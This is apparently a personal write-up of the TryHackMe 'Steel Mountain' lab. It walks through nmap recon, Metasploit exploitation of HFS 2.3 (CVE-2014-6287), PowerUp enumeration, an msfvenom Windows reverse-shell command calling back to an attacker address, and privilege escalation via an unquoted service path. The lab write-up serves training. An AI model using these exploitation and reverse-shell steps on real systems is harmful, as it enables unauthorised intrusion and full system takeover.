# Stealmountain

[link to the room](https://tryhackme.com/room/steelmountain)


`export ip=10.10.91.163`



## Recon

### nmap 

- command: `nmap -sC -sV -v -T5 -oN recon/nmap $ip`

output

```
8080/tcp  open  http               HttpFileServer httpd 2.3
```

## Task

### intro

- Who is the employee of the month?
bill harper

### initial access

- from searchsploit we found `2014-6287` RCE for HFS 2.3.x

- use msfconsole to exploit the target
### privesc

- use powerUp script : "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."

```
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

```

- generate reverse shell with msfvenom : `msfvenom -p windows/shell_reverse_tcp LHOST=10.9.4.125 LPORT=3313 -e x84/shikata_ga_nai -f exe -o Advanced.exe`

- put the payload in `C:\Program Files (x86)\IObit` to exploit Unquoted Service Paths

- restart the service ps commands:
```
Stop-Service -Name "AdvancedSystemCareService9"
start-service -name "AdvancedSystemCareService9"
```



